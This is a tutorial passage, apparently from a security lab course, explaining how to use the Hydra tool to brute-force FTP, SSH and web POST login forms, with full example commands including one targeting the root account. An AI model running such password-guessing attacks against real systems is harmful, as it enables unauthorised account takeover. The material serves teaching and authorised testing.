# Using Hydra

## <span style="color: inherit;">Hydra</span> Commands

The options we pass into <span style="color: inherit;">Hydra</span> depend on which service (protocol) we’re attacking. For example, if we wanted to brute force <span style="color: inherit;">FTP</span> with the username being `user` and a password list being `passlist.txt`, we’d use the following command:

`hydra -l user -P passlist.txt ftp://MACHINE_IP`

Here are the commands to use <span style="color: inherit;">Hydra</span> on <span style="color: inherit;">SSH</span> and a web form (POST method).

### <span style="color: inherit;">SSH</span>

`hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`

| Option | Description |
| --- | --- |
| `-l` | specifies the (<span style="color: inherit;">SSH</span>) username for login |
| `-P` | indicates a list of passwords |
| `-t` | sets the number of threads to spawn |

For example, `hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh` will run with the following arguments:

- <span style="color: inherit;">Hydra</span> will use `root` as the username for `ssh`
- It will try the passwords in the `passwords.txt` file
- There will be four threads running in parallel as indicated by `-t 4`

### Post Web Form

We can use <span style="color: inherit;">Hydra</span> to brute force web forms too. You must know which type of request it is making; GET or POST methods are commonly used. You can use your browser’s network tab (in developer tools) to see the request types or view the source code.

`sudo hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>" -V`

| Option | Description |
| --- | --- |
| `-l` | the username for (web form) login |
| `-P` | the password list to use |
| `http-post-form` | the type of the form is POST |
| `<path>` | the login page URL, for example, `login.php` |
| `<login_credentials>` | the username and password used to log in, for example, `username=^USER^&password=^PASS^` |
| `<invalid_response>` | part of the response when the login fails |
| `-V` | verbose output for every attempt |

Below is a more concrete example <span style="color: inherit;">Hydra</span> command to brute force a POST login form:

`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

- The login page is only `/`, i.e., the main IP address.
- The `username` is the form field where the username is entered
- The specified username(s) in `-l` will replace `^USER^`
- The `password` is the form field where the password is entered
- The provided passwords in `-P` will be replacing `^PASS^`
- Finally, `F=incorrect` is a string that appears in the server reply when the login fails
